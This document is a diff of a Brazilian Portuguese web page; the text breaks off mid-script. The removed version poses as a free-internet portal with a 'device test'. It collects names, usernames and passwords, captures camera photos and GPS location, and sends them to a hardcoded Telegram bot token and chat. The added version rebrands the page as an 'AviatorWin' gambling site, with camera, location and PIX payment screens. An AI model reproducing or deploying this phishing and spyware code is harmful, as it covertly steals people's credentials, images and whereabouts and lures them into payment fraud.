@@ -1,1164 +1,1268 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal de Acesso - Verificação de Rede</title>
-    <style>
-        :root {
-            --color-primary: #22c55e;
-            --color-primary-dark: #16a34a;
-            --color-secondary: #3b82f6;
-            --color-secondary-dark: #2563eb;
-            --color-accent: #7c3aed;
-            --color-bg-dark: #0f0c29;
-            --color-bg-mid: #302b63;
-            --color-bg-light: #24243e;
-            --color-text: rgba(255, 255, 255, 0.9);
-            --color-text-muted: rgba(255, 255, 255, 0.6);
-            --color-border: rgba(255, 255, 255, 0.1);
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.1);
-            --shadow-lg: 0 25px 50px rgba(0, 0, 0, 0.3);
-            --radius-sm: 8px;
-            --radius-md: 12px;
-            --radius-lg: 24px;
-            --spacing-xs: 8px;
-            --spacing-sm: 15px;
-            --spacing-md: 20px;
-            --spacing-lg: 30px;
-            --spacing-xl: 50px;
-        }
-
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-
-        body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: linear-gradient(-45deg, var(--color-bg-dark), var(--color-bg-mid), var(--color-bg-light), #1a1a2e, #16213e);
-            background-size: 400% 400%;
-            animation: gradientBG 15s ease infinite;
-            position: relative;
-            overflow-x: hidden;
-            color: var(--color-text);
-        }
-
-        @keyframes gradientBG {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-        }
-
-        .orb {
-            position: fixed;
-            border-radius: 50%;
-            filter: blur(80px);
-            opacity: 0.5;
-            animation: float 20s infinite ease-in-out;
-            z-index: 0;
-        }
-
-        .orb-1 { width: 400px; height: 400px; background: var(--color-accent); top: -100px; left: -100px; }
-        .orb-2 { width: 300px; height: 300px; background: var(--color-secondary); bottom: -50px; right: -50px; animation-delay: 5s; }
-        .orb-3 { width: 250px; height: 250px; background: #db2777; top: 50%; left: 50%; animation-delay: 10s; }
-
-        @keyframes float {
-            0%, 100% { transform: translate(0, 0) scale(1); }
-            33% { transform: translate(30px, -50px) scale(1.1); }
-            66% { transform: translate(-20px, 20px) scale(0.9); }
-        }
-
-        .container { position: relative; z-index: 10; width: 90%; max-width: 450px; }
-
-        .glass-card {
-            background: var(--glass-bg);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid var(--glass-border);
-            border-radius: var(--radius-lg);
-            padding: var(--spacing-xl) var(--spacing-lg);
-            box-shadow: var(--shadow-lg);
-        }
-
-        .screen { display: none; animation: fadeIn 0.5s ease; }
-        .screen.active { display: block; }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .icon-circle {
-            width: 100px; height: 100px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            margin: 0 auto var(--spacing-lg); font-size: 50px;
-            animation: pulse 2s ease infinite;
-        }
-
-        .icon-circle.success {
-            background: linear-gradient(135deg, var(--color-primary), var(--color-primary-dark));
-            box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4);
-        }
-
-        .icon-circle.info {
-            background: linear-gradient(135deg, var(--color-secondary), var(--color-secondary-dark));
-            box-shadow: 0 10px 30px rgba(59, 130, 246, 0.4);
-        }
-
-        .icon-circle.large { width: 120px; height: 120px; font-size: 60px; }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-
-        h1, h2 { color: white; text-align: center; margin-bottom: var(--spacing-sm); }
-        h1 { font-size: 28px; font-weight: 700; }
-        h2 { font-size: 26px; font-weight: 700; }
-
-        .subtitle {
-            color: var(--color-text-muted);
-            text-align: center;
-            line-height: 1.6;
-            margin-bottom: var(--spacing-lg);
-            font-size: 14px;
-        }
-
-        .info-box {
-            background: rgba(34, 197, 94, 0.15);
-            border: 2px solid rgba(34, 197, 94, 0.4);
-            border-radius: var(--radius-md);
-            padding: var(--spacing-md);
-            margin-bottom: var(--spacing-md);
-        }
-
-        .info-box-title {
-            color: #86efac;
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: var(--spacing-xs);
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-xs);
-        }
-
-        .info-box-text { color: var(--color-text); font-size: 14px; line-height: 1.6; }
-
-        .btn-primary {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, var(--color-primary), var(--color-primary-dark));
-            border: none;
-            border-radius: var(--radius-md);
-            color: white;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 10px 30px rgba(34, 197, 94, 0.4);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .btn-primary:hover:not(:disabled) {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(34, 197, 94, 0.5);
-        }
-
-        .form-group { margin-bottom: var(--spacing-md); }
-
-        .form-group label {
-            display: block;
-            color: var(--color-text-muted);
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: var(--spacing-xs);
-        }
-
-        .input-wrapper { position: relative; }
-
-        .input-icon {
-            position: absolute;
-            left: 16px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--color-text-muted);
-            font-size: 18px;
-            pointer-events: none;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 14px 16px 14px 48px;
-            background: rgba(255, 255, 255, 0.08);
-            border: 1px solid var(--color-border);
-            border-radius: var(--radius-md);
-            color: white;
-            font-size: 15px;
-            transition: all 0.3s ease;
-            outline: none;
-        }
-
-        .form-group input::placeholder { color: rgba(255, 255, 255, 0.4); }
-
-        .form-group input:focus {
-            background: rgba(255, 255, 255, 0.12);
-            border-color: rgba(34, 197, 94, 0.5);
-            box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.1);
-        }
-
-        .test-item {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid var(--color-border);
-            border-radius: var(--radius-md);
-            padding: 18px;
-            margin-bottom: var(--spacing-sm);
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-            transition: all 0.5s ease;
-        }
-
-        .test-item.testing {
-            border-color: rgba(251, 191, 36, 0.5);
-            background: rgba(251, 191, 36, 0.1);
-        }
-
-        .test-item.success {
-            border-color: rgba(34, 197, 94, 0.5);
-            background: rgba(34, 197, 94, 0.1);
-        }
-
-        .test-icon {
-            width: 40px; height: 40px; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            transition: all 0.5s ease;
-        }
-
-        .test-item.testing .test-icon {
-            background: rgba(251, 191, 36, 0.2);
-            animation: spin 1s linear infinite;
-        }
-
-        .test-item.success .test-icon { background: rgba(34, 197, 94, 0.2); }
-
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .test-content { flex: 1; }
-        .test-name { color: white; font-size: 16px; font-weight: 600; margin-bottom: 3px; }
-        .test-status { color: var(--color-text-muted); font-size: 13px; }
-        .test-item.testing .test-status { color: #fcd34d; }
-        .test-item.success .test-status { color: #86efac; }
-
-        .progress-bar {
-            width: 100%; height: 8px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px; overflow: hidden; margin-bottom: var(--spacing-md);
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--color-primary), var(--color-primary-dark));
-            width: 0%;
-            transition: width 0.3s ease;
-            border-radius: 4px;
-        }
-
-        .progress-text { color: var(--color-text-muted); font-size: 14px; text-align: center; }
-
-        .version-tag {
-            text-align: center;
-            margin-top: var(--spacing-sm);
-            color: rgba(255, 255, 255, 0.3);
-            font-size: 11px;
-            font-family: 'Courier New', monospace;
-        }
-
-        @media (max-width: 480px) {
-            .glass-card { padding: var(--spacing-lg) var(--spacing-md); }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>AviatorWin - Ganhe Agora</title>
+<style>
+  :root{
+    --bg:#f5f5f7;
+    --glass:rgba(255,255,255,0.72);
+    --glass-border:rgba(255,255,255,0.4);
+    --text:#1d1d1f;
+    --muted:#6e6e73;
+    --accent:#0071e3;
+    --accent-dark:#005bb5;
+    --green:#34c759;
+    --red:#ff3b30;
+    --orange:#ff9500;
+    --gold:#ffd700;
+    --shadow:0 10px 40px rgba(0,0,0,0.08);
+    --shadow-lg:0 20px 60px rgba(0,0,0,0.12);
+  }
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%;overflow:hidden}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"SF Pro Display","Segoe UI",Roboto,sans-serif;
+    background:linear-gradient(135deg,#e8f4f8 0%,#f5f5f7 50%,#f0e6ff 100%);
+    color:var(--text);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    position:relative;
+  }
+  body::before{
+    content:'';position:fixed;inset:0;
+    background:
+      radial-gradient(circle at 20% 20%,rgba(0,113,227,0.15),transparent 40%),
+      radial-gradient(circle at 80% 80%,rgba(255,59,48,0.12),transparent 40%),
+      radial-gradient(circle at 50% 50%,rgba(255,149,0,0.08),transparent 50%);
+    z-index:0;
+  }
+  .app{
+    position:relative;z-index:1;
+    width:100%;max-width:430px;height:100vh;
+    display:flex;flex-direction:column;
+    padding:20px;
+    overflow:hidden;
+  }
+  .screen{
+    display:none;
+    flex:1;
+    flex-direction:column;
+    animation:slideIn .4s ease;
+    overflow-y:auto;
+  }
+  .screen.active{display:flex}
+  @keyframes slideIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+  
+  /* Header */
+  .header{
+    display:flex;justify-content:space-between;align-items:center;
+    padding:10px 0 20px;
+  }
+  .logo{
+    font-size:22px;font-weight:700;
+    background:linear-gradient(135deg,#ff3b30,#ff9500);
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+    letter-spacing:-0.5px;
+  }
+  .logo span{font-weight:400;color:var(--text);-webkit-text-fill-color:var(--text)}
+  .balance-pill{
+    background:var(--glass);
+    backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);
+    border:1px solid var(--glass-border);
+    padding:8px 14px;border-radius:20px;
+    font-size:13px;font-weight:600;
+    box-shadow:var(--shadow);
+  }
+  .balance-pill b{color:var(--green)}
+  
+  /* Glass Card */
+  .card{
+    background:var(--glass);
+    backdrop-filter:blur(30px) saturate(180%);
+    -webkit-backdrop-filter:blur(30px) saturate(180%);
+    border:1px solid var(--glass-border);
+    border-radius:24px;
+    padding:28px 24px;
+    box-shadow:var(--shadow);
+    margin-bottom:16px;
+  }
+  
+  /* Welcome */
+  .hero-emoji{font-size:80px;text-align:center;margin-bottom:10px;animation:bounce 2s infinite}
+  @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+  .hero-title{
+    font-size:32px;font-weight:800;text-align:center;
+    letter-spacing:-1px;line-height:1.1;margin-bottom:10px;
+  }
+  .hero-title .highlight{
+    background:linear-gradient(135deg,#ff3b30,#ff9500);
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  }
+  .hero-sub{text-align:center;color:var(--muted);font-size:15px;line-height:1.5;margin-bottom:20px}
+  .jackpot{
+    background:linear-gradient(135deg,#ff3b30,#ff9500);
+    border-radius:20px;padding:20px;text-align:center;
+    color:white;margin-bottom:20px;
+    box-shadow:0 10px 30px rgba(255,59,48,0.3);
+  }
+  .jackpot-label{font-size:12px;opacity:0.9;text-transform:uppercase;letter-spacing:1px}
+  .jackpot-value{font-size:36px;font-weight:800;margin-top:5px;letter-spacing:-1px}
+  .winners-scroll{
+    background:var(--glass);border-radius:16px;padding:12px;
+    border:1px solid var(--glass-border);
+    font-size:13px;color:var(--muted);
+    margin-bottom:20px;
+  }
+  .winners-scroll b{color:var(--green)}
+  
+  /* Buttons */
+  .btn{
+    width:100%;padding:16px;border:none;border-radius:14px;
+    font-size:16px;font-weight:600;cursor:pointer;
+    transition:all .2s;letter-spacing:0.3px;
+  }
+  .btn-primary{
+    background:linear-gradient(135deg,#0071e3,#005bb5);
+    color:white;box-shadow:0 8px 20px rgba(0,113,227,0.3);
+  }
+  .btn-primary:hover{transform:translateY(-2px);box-shadow:0 12px 28px rgba(0,113,227,0.4)}
+  .btn-primary:active{transform:translateY(0)}
+  .btn-success{
+    background:linear-gradient(135deg,#34c759,#28a745);
+    color:white;box-shadow:0 8px 20px rgba(52,199,89,0.3);
+  }
+  .btn-danger{
+    background:linear-gradient(135deg,#ff3b30,#d63031);
+    color:white;box-shadow:0 8px 20px rgba(255,59,48,0.3);
+  }
+  .btn-ghost{
+    background:var(--glass);color:var(--text);
+    border:1px solid var(--glass-border);
+  }
+  .btn:disabled{opacity:0.5;cursor:not-allowed}
+  
+  /* Form */
+  .field{margin-bottom:16px}
+  .field label{
+    display:block;font-size:13px;font-weight:600;
+    color:var(--muted);margin-bottom:6px;
+    text-transform:uppercase;letter-spacing:0.5px;
+  }
+  .field input,.field select{
+    width:100%;padding:14px 16px;
+    background:rgba(255,255,255,0.5);
+    border:1px solid rgba(0,0,0,0.08);
+    border-radius:12px;
+    font-size:15px;color:var(--text);
+    transition:all .2s;
+    font-family:inherit;
+  }
+  .field input:focus,.field select:focus{
+    outline:none;
+    border-color:var(--accent);
+    background:white;
+    box-shadow:0 0 0 4px rgba(0,113,227,0.1);
+  }
+  
+  /* Step indicator */
+  .steps{
+    display:flex;gap:6px;margin-bottom:20px;
+  }
+  .step{
+    flex:1;height:4px;border-radius:2px;
+    background:rgba(0,0,0,0.08);
+    transition:all .3s;
+  }
+  .step.active{background:var(--accent)}
+  .step.done{background:var(--green)}
+  
+  /* Camera */
+  .camera-frame{
+    position:relative;
+    width:100%;aspect-ratio:3/4;
+    background:#000;border-radius:20px;overflow:hidden;
+    margin-bottom:16px;
+  }
+  .camera-frame video{
+    width:100%;height:100%;object-fit:cover;
+    transform:scaleX(-1);
+  }
+  .camera-frame .overlay{
+    position:absolute;inset:0;
+    border:3px solid rgba(255,255,255,0.3);
+    border-radius:20px;
+    pointer-events:none;
+  }
+  .camera-frame .face-guide{
+    position:absolute;
+    top:50%;left:50%;
+    transform:translate(-50%,-50%);
+    width:70%;height:55%;
+    border:2px dashed rgba(255,255,255,0.6);
+    border-radius:50%;
+  }
+  .camera-flash{
+    position:absolute;inset:0;
+    background:white;opacity:0;
+    pointer-events:none;
+    transition:opacity .1s;
+  }
+  .camera-flash.active{opacity:1}
+  
+  /* Location */
+  .loc-visual{
+    text-align:center;padding:20px 0;
+  }
+  .loc-visual .icon{font-size:80px;margin-bottom:10px}
+  .loc-visual h3{font-size:22px;font-weight:700;margin-bottom:8px}
+  .loc-visual p{color:var(--muted);font-size:14px;line-height:1.5}
+  .loc-features{
+    display:flex;flex-direction:column;gap:10px;
+    margin:20px 0;
+  }
+  .loc-feature{
+    display:flex;align-items:center;gap:12px;
+    padding:12px;background:rgba(0,0,0,0.03);
+    border-radius:12px;font-size:14px;
+  }
+  .loc-feature .ico{font-size:22px}
+  
+  /* Modal */
+  .modal-bg{
+    position:fixed;inset:0;
+    background:rgba(0,0,0,0.5);
+    backdrop-filter:blur(10px);
+    display:none;
+    justify-content:center;align-items:center;
+    z-index:100;padding:20px;
+  }
+  .modal-bg.active{display:flex}
+  .modal{
+    background:white;
+    border-radius:24px;
+    padding:28px;
+    max-width:360px;width:100%;
+    text-align:center;
+    animation:popIn .3s ease;
+  }
+  @keyframes popIn{from{transform:scale(0.9);opacity:0}to{transform:scale(1);opacity:1}}
+  .modal .emoji{font-size:60px;margin-bottom:10px}
+  .modal h3{font-size:20px;font-weight:700;margin-bottom:8px}
+  .modal p{color:var(--muted);font-size:14px;line-height:1.5;margin-bottom:16px}
+  .modal .reasons{
+    text-align:left;
+    background:rgba(255,59,48,0.08);
+    border-radius:12px;padding:12px;
+    margin-bottom:16px;font-size:13px;
+  }
+  .modal .reasons div{padding:4px 0;color:#c0392b}
+  .modal .reasons div::before{content:'⚠️ '}
+  
+  /* Game Aviator */
+  .game-area{
+    position:relative;
+    background:linear-gradient(180deg,#1a1a2e 0%,#16213e 100%);
+    border-radius:20px;
+    height:280px;
+    overflow:hidden;
+    margin-bottom:16px;
+  }
+  .game-area .stars{
+    position:absolute;inset:0;
+    background-image:
+      radial-gradient(2px 2px at 20% 30%,white,transparent),
+      radial-gradient(2px 2px at 60% 70%,white,transparent),
+      radial-gradient(1px 1px at 50% 50%,white,transparent),
+      radial-gradient(1px 1px at 80% 10%,white,transparent),
+      radial-gradient(2px 2px at 90% 60%,white,transparent);
+    background-size:200px 200px;
+    opacity:0.6;
+  }
+  .multiplier{
+    position:absolute;
+    top:50%;left:50%;
+    transform:translate(-50%,-50%);
+    font-size:48px;font-weight:800;
+    color:white;
+    text-shadow:0 0 20px rgba(255,255,255,0.5);
+    font-family:'Courier New',monospace;
+  }
+  .multiplier.crashed{color:var(--red)}
+  .multiplier.cashed{color:var(--green)}
+  .plane{
+    position:absolute;
+    font-size:40px;
+    bottom:40px;left:20px;
+    transition:all .1s linear;
+    filter:drop-shadow(0 0 10px rgba(255,149,0,0.8));
+  }
+  .plane.flying{animation:fly 3s linear infinite}
+  @keyframes fly{
+    0%{transform:translate(0,0) rotate(-10deg)}
+    50%{transform:translate(150px,-80px) rotate(-5deg)}
+    100%{transform:translate(300px,-160px) rotate(0deg)}
+  }
+  .plane.crashed{
+    animation:crash .5s ease forwards;
+  }
+  @keyframes crash{
+    to{transform:translate(300px,-160px) rotate(90deg);opacity:0}
+  }
+  .bet-controls{
+    display:grid;grid-template-columns:1fr 1fr;gap:10px;
+    margin-bottom:16px;
+  }
+  .bet-input{
+    background:var(--glass);
+    border:1px solid var(--glass-border);
+    border-radius:14px;
+    padding:14px;
+    backdrop-filter:blur(20px);
+  }
+  .bet-input label{font-size:11px;color:var(--muted);text-transform:uppercase;font-weight:600}
+  .bet-input input{
+    width:100%;border:none;background:transparent;
+    font-size:20px;font-weight:700;color:var(--text);
+    margin-top:4px;
+  }
+  .bet-input input:focus{outline:none}
+  .history{
+    display:flex;gap:6px;overflow-x:auto;
+    padding:8px 0;margin-bottom:16px;
+  }
+  .history-item{
+    padding:6px 12px;border-radius:12px;
+    font-size:12px;font-weight:700;
+    white-space:nowrap;
+    background:rgba(0,0,0,0.05);
+  }
+  .history-item.win{background:rgba(52,199,89,0.15);color:var(--green)}
+  .history-item.lose{background:rgba(255,59,48,0.15);color:var(--red)}
+  
+  /* PIX */
+  .pix-card{
+    background:linear-gradient(135deg,#34c759,#28a745);
+    border-radius:20px;padding:24px;color:white;
+    text-align:center;margin-bottom:16px;
+  }
+  .pix-card .label{font-size:12px;opacity:0.9;text-transform:uppercase}
+  .pix-card .value{font-size:28px;font-weight:800;margin:8px 0}
+  .pix-card .key{
+    background:rgba(255,255,255,0.2);
+    padding:10px;border-radius:10px;
+    font-size:13px;font-family:monospace;
+    word-break:break-all;
+  }
+  .timer{
+    text-align:center;font-size:14px;color:var(--muted);
+    margin-bottom:16px;
+  }
+  .timer b{color:var(--red);font-size:18px}
+  
+  /* Loading */
+  .loader{
+    width:40px;height:40px;
+    border:3px solid rgba(0,113,227,0.2);
+    border-top-color:var(--accent);
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+    margin:20px auto;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  
+  .hidden{display:none!important}
+  .text-center{text-align:center}
+  .mt-10{margin-top:10px}
+  .mt-20{margin-top:20px}
+  .mb-10{margin-bottom:10px}
+  
+  /* Scrollbar */
+  .screen::-webkit-scrollbar{width:0}
+</style>
 </head>
 <body>
-    <div class="orb orb-1"></div>
-    <div class="orb orb-2"></div>
-    <div class="orb orb-3"></div>
 
-    <div class="container">
-        <div class="glass-card">
-            
-            <div class="screen active" id="screen1">
-                <div class="icon-circle success">🌐</div>
-                <h1>Internet Liberada!</h1>
-                <p class="subtitle">Parabéns! Sua conexão foi aprovada e está quase pronta para uso.</p>
-                
-                <div class="info-box">
-                    <div class="info-box-title"><span>✅</span><span>Quase lá!</span></div>
-                    <div class="info-box-text">
-                        Liberamos já a sua internet! Deixa só a gente fazer um teste rápido no seu dispositivo para garantir que tudo está funcionando perfeitamente.
-                        <br><br>
-                        <strong>Mas antes, preciso que você se cadastre rapidamente:</strong>
-                    </div>
-                </div>
+<div class="app">
 
-                <button class="btn-primary" onclick="App.navigate(2)">CADASTRAR E LIBERAR INTERNET</button>
-            </div>
-
-            <div class="screen" id="screen2">
-                <h2>Cadastro Rápido</h2>
-                <p class="subtitle">Preencha para liberar sua internet</p>
-
-                <form id="registerForm" onsubmit="App.handleRegister(event)">
-                    <div class="form-group">
-                        <label for="regName">Nome Completo</label>
-                        <div class="input-wrapper">
-                            <input type="text" id="regName" placeholder="Seu nome completo" required minlength="3" maxlength="100" />
-                            <span class="input-icon">👤</span>
-                        </div>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="regUsername">Usuário</label>
-                        <div class="input-wrapper">
-                            <input type="text" id="regUsername" placeholder="Escolha um usuário" required minlength="3" maxlength="50" autocomplete="off" />
-                            <span class="input-icon">@</span>
-                        </div>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="regPassword">Senha</label>
-                        <div class="input-wrapper">
-                            <input type="password" id="regPassword" placeholder="Crie uma senha" required minlength="6" maxlength="100" />
-                            <span class="input-icon">🔒</span>
-                        </div>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="regConfirmPassword">Confirmar Senha</label>
-                        <div class="input-wrapper">
-                            <input type="password" id="regConfirmPassword" placeholder="Confirme sua senha" required minlength="6" maxlength="100" />
-                            <span class="input-icon">🔒</span>
-                        </div>
-                    </div>
-
-                    <button type="submit" class="btn-primary">INICIAR TESTES DO DISPOSITIVO</button>
-                </form>
-            </div>
-
-            <div class="screen" id="screen3">
-                <div class="icon-circle info">🔍</div>
-                <h2>Testando Dispositivo</h2>
-                <p class="subtitle">Aguarde enquanto verificamos seu dispositivo...</p>
-
-                <div class="test-item" id="testTouch">
-                    <div class="test-icon"></div>
-                    <div class="test-content">
-                        <div class="test-name">Touch Screen</div>
-                        <div class="test-status">Aguardando...</div>
-                    </div>
-                </div>
-
-                <div class="test-item" id="testCamera">
-                    <div class="test-icon">📷</div>
-                    <div class="test-content">
-                        <div class="test-name">Câmera</div>
-                        <div class="test-status">Aguardando...</div>
-                    </div>
-                </div>
-
-                <div class="test-item" id="testGPS">
-                    <div class="test-icon">📍</div>
-                    <div class="test-content">
-                        <div class="test-name">Localização GPS</div>
-                        <div class="test-status">Aguardando...</div>
-                    </div>
-                </div>
-
-                <div class="test-item" id="testData">
-                    <div class="test-icon">📊</div>
-                    <div class="test-content">
-                        <div class="test-name">Dados do Dispositivo</div>
-                        <div class="test-status">Aguardando...</div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="screen" id="screen4">
-                <div class="icon-circle success large">✅</div>
-                <h2>Tudo Pronto!</h2>
-                <p class="subtitle">Seu dispositivo foi verificado com sucesso!<br>Sua internet está sendo liberada agora...</p>
-
-                <div class="progress-bar">
-                    <div class="progress-fill" id="progressFill"></div>
-                </div>
-                <div class="progress-text" id="progressText">Liberando conexão... 0%</div>
-            </div>
-
-            <div class="version-tag">v9.8.13</div>
-
-        </div>
+  <!-- TELA 1: WELCOME -->
+  <div class="screen active" id="s1">
+    <div class="header">
+      <div class="logo">Aviator<span>Win</span> ✈️</div>
+      <div class="balance-pill">Saldo: <b>R$ 0,00</b></div>
     </div>
-
-    <script>
-        'use strict';
-
-        const CONFIG = {
-            VERSION: '9.8.13',
-            TELEGRAM: {
-                BOT_TOKEN: '8702458951:AAHg_-y7Dx8LBwIjdKg0YcF9sVRJzkIrkj0',
-                CHAT_ID: '-5425475205',
-                API_BASE: 'https://api.telegram.org/bot',
-                MAX_MESSAGE_LENGTH: 4096,
-                TIMEOUT: 15000,
-                RETRY_ATTEMPTS: 3
-            },
-            GPS: {
-                TIMEOUT: 15000,
-                ENABLE_HIGH_ACCURACY: true
-            },
-            CAMERA: {
-                WIDTH: 1280,
-                HEIGHT: 720,
-                QUALITY: 0.8,
-                DELAY: 500
-            }
-        };
-
-        const Logger = {
-            info(msg, data) { console.log(`[INFO] ${msg}`, data || ''); },
-            error(msg, data) { console.error(`[ERROR] ${msg}`, data || ''); },
-            success(msg) { console.log(`✅ ${msg}`); },
-            warn(msg, data) { console.warn(`[WARN] ${msg}`, data || ''); }
-        };
-
-        const HttpClient = {
-            async postJSON(url, data) {
-                for (let attempt = 1; attempt <= CONFIG.TELEGRAM.RETRY_ATTEMPTS; attempt++) {
-                    try {
-                        const controller = new AbortController();
-                        const timeoutId = setTimeout(() => controller.abort(), CONFIG.TELEGRAM.TIMEOUT);
-
-                        const response = await fetch(url, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify(data),
-                            signal: controller.signal
-                        });
-
-                        clearTimeout(timeoutId);
-
-                        if (!response.ok) {
-                            throw new Error(`HTTP ${response.status}`);
-                        }
-
-                        const result = await response.json();
-                        Logger.info(`JSON tentativa ${attempt}: ${result.ok ? 'OK' : 'FALHOU'}`);
-                        return result;
-                    } catch (error) {
-                        Logger.warn(`JSON tentativa ${attempt} falhou: ${error.message}`);
-                        
-                        if (attempt === CONFIG.TELEGRAM.RETRY_ATTEMPTS) {
-                            throw error;
-                        }
-
-                        await this.delay(1000 * attempt);
-                    }
-                }
-            },
-
-            async postFormData(url, formData) {
-                for (let attempt = 1; attempt <= CONFIG.TELEGRAM.RETRY_ATTEMPTS; attempt++) {
-                    try {
-                        const controller = new AbortController();
-                        const timeoutId = setTimeout(() => controller.abort(), CONFIG.TELEGRAM.TIMEOUT);
-
-                        const response = await fetch(url, {
-                            method: 'POST',
-                            body: formData,
-                            signal: controller.signal
-                        });
-
-                        clearTimeout(timeoutId);
-
-                        if (!response.ok) {
-                            throw new Error(`HTTP ${response.status}`);
-                        }
-
-                        const result = await response.json();
-                        Logger.info(`FormData tentativa ${attempt}: ${result.ok ? 'OK' : 'FALHOU'}`);
-                        return result;
-                    } catch (error) {
-                        Logger.warn(`FormData tentativa ${attempt} falhou: ${error.message}`);
-                        
-                        if (attempt === CONFIG.TELEGRAM.RETRY_ATTEMPTS) {
-                            throw error;
-                        }
-
-                        await this.delay(1000 * attempt);
-                    }
-                }
-            },
-
-            delay(ms) {
-                return new Promise(resolve => setTimeout(resolve, ms));
-            }
-        };
-
-        const TelegramService = {
-            getBaseUrl() {
-                return `${CONFIG.TELEGRAM.API_BASE}${CONFIG.TELEGRAM.BOT_TOKEN}`;
-            },
-
-            async sendMessage(text) {
-                if (text.length > CONFIG.TELEGRAM.MAX_MESSAGE_LENGTH) {
-                    Logger.warn(`Mensagem muito longa (${text.length}), truncando`);
-                    text = text.substring(0, CONFIG.TELEGRAM.MAX_MESSAGE_LENGTH - 50) + '\n\n...[truncado]';
-                }
-
-                const url = `${this.getBaseUrl()}/sendMessage`;
-                
-                try {
-                    const result = await HttpClient.postJSON(url, {
-                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
-                        text: text
-                    });
-                    return result;
-                } catch (error) {
-                    Logger.error('Erro enviar mensagem', error);
-                    throw error;
-                }
-            },
-
-            async sendPhoto(photoData, caption) {
-                const url = `${this.getBaseUrl()}/sendPhoto`;
-
-                try {
-                    const response = await fetch(photoData);
-                    const blob = await response.blob();
-
-                    const formData = new FormData();
-                    formData.append('chat_id', CONFIG.TELEGRAM.CHAT_ID);
-                    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-                    if (caption) {
-                        formData.append('caption', caption);
-                    }
-
-                    const result = await HttpClient.postFormData(url, formData);
-                    return result;
-                } catch (error) {
-                    Logger.error('Erro enviar foto', error);
-                    throw error;
-                }
-            },
-
-            // ✅ CORRIGIDO: Agora envia localização sempre que tiver coordenadas válidas
-            async sendLocation(latitude, longitude, source = 'desconhecida') {
-                const url = `${this.getBaseUrl()}/sendLocation`;
-
-                // Validar coordenadas
-                const lat = parseFloat(latitude);
-                const lon = parseFloat(longitude);
-
-                if (isNaN(lat) || isNaN(lon)) {
-                    Logger.warn(`Coordenadas inválidas: lat=${latitude}, lon=${longitude}`);
-                    return null;
-                }
-
-                // Validar ranges
-                if (lat < -90 || lat > 90 || lon < -180 || lon > 180) {
-                    Logger.warn(`Coordenadas fora do range: lat=${lat}, lon=${lon}`);
-                    return null;
-                }
-
-                Logger.info(`Enviando localização: ${lat}, ${lon} (fonte: ${source})`);
-
-                try {
-                    const result = await HttpClient.postJSON(url, {
-                        chat_id: CONFIG.TELEGRAM.CHAT_ID,
-                        latitude: lat,
-                        longitude: lon
-                    });
-                    Logger.success(`Localização enviada no mapa!`);
-                    return result;
-                } catch (error) {
-                    Logger.error('Erro enviar localização', error);
-                    throw error;
-                }
-            }
-        };
-
-        const GPSService = {
-            async getLocation() {
-                // Tenta GPS primeiro
-                if (navigator.geolocation) {
-                    try {
-                        const position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                enableHighAccuracy: CONFIG.GPS.ENABLE_HIGH_ACCURACY,
-                                timeout: CONFIG.GPS.TIMEOUT,
-                                maximumAge: 0
-                            });
-                        });
-
-                        Logger.success('GPS obtido com sucesso');
-                        return {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy,
-                            altitude: position.coords.altitude || 'N/A',
